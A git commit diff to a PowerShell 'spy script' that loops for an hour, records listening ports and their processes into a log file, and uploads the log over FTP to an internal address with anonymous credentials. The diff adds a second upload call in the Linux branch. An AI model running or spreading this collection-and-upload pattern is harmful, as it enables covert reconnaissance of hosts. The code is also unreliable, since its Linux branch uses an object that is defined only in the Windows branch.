63a738f3c9e511430fed85b9ee6b6640504da10c
The_Regicider <109181364+Regicider@users.noreply.github.com>
2024-09-17 13:56:41 -0400

    Update Potbelly.ps1

--- Potbelly.ps1
+++ Potbelly.ps1
@@ -1,5 +1,8 @@
 #Powershell Spy Script
 
+if ($IsWindows) {
+#man LinRun loop. script will run every 2 min for 1 hr (x30):
+
 #Start Site:
 
 $ftp = "ftp://10.254.0.22/portdump/"
@@ -9,9 +12,6 @@ $localFile = ".\cracklins.log"
 $webclient = New-Object System.Net.WebClient
 $webclient.Credentials = New-Object System.Net.NetworkCredential($username, $password)
 
-if ($IsWindows) {
-#man LinRun loop. script will run every 2 min for 1 hr (x30):
-
 for ($cnt = 1; $cnt -le 30; $cnt++)
 
 {
@@ -20,7 +20,7 @@ for ($cnt = 1; $cnt -le 30; $cnt++)
 Write-Host "Windows"
 
 #Get Time For FileName:
-Get-Date -Second | Out-File -FilePath .\cracklins.log -Append
+Get-Date | Out-File -FilePath .\cracklins.log -Append
 
 #Collect Open Ports:
 get-nettcpconnection | where {($_.State -eq "Listen") -and ($_.RemoteAddress -eq "0.0.0.0")} | select LocalAddress,LocalPort,RemoteAddress,RemotePort,State,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | ft | Out-File -FilePath .\cracklins.log -Append
@@ -37,6 +37,15 @@ Start-Sleep 120
 elseif ($IsLinux) {
 #man LinRun loop. script will run every 2 min for 1 hr (x30):
 
+#Send WebReq:
+
+$ftp = "ftp://10.254.0.22/portdump/"
+$username = "anon"
+$password = ""
+$localFile = ".\cracklins.log"
+$credentials = New-Object System.Net.NetworkCredential($username, $password)
+Invoke-WebRequest -Uri $ftp -Method Put -InFile $localFile -Credential $credentials
+
 for ($cnt = 1; $cnt -le 30; $cnt++)
 
 {
@@ -45,16 +54,17 @@ for ($cnt = 1; $cnt -le 30; $cnt++)
 Write-Host "Linux"
 
 #Get Time For FileName:
-Get-Date -Second | Out-File -FilePath .\cracklins.log -Append
+Get-Date | Out-File -FilePath .\cracklins.log -Append
 
 #Collect Open Ports:
 netstat -an | Select-String "LISTENING" | Out-File -FilePath .\cracklins.log -Append
 
 #Send Home:
-$webclient.UploadFile($ftp, $localFile)
+$webclient.UploadFile($ftp,$localFile)
 
 #2 min sleep
 Start-Sleep 120
 
+}
 }
 }
